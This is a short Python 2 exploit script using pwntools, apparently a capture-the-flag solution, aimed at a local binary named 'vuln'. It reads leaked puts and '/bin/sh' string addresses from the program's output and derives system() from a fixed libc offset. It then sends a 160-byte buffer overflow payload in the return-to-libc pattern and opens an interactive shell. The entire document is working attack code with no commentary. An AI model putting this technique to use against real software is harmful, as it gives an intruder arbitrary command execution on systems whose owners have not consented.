import pwn
import re

puts_addr = 0xf7e3e290
system_addr= 0xf7e12420

offset = puts_addr - system_addr

elf = pwn.ELF('./vuln')
p = elf.process()

prompt = p.recv()
# print prompt

puts = int(re.findall("puts: (.*)", prompt)[0] ,16)
bin_bash  = int(re.findall("useful_string: (.*)",prompt)[0] ,16)

print "=================="
print puts
print bin_bash

system = puts - offset


payload = 'a'*160
payload += pwn.p32(system)
payload += "JUNK"
payload += pwn.p32(bin_bash)

p.sendline(payload)
p.interactive()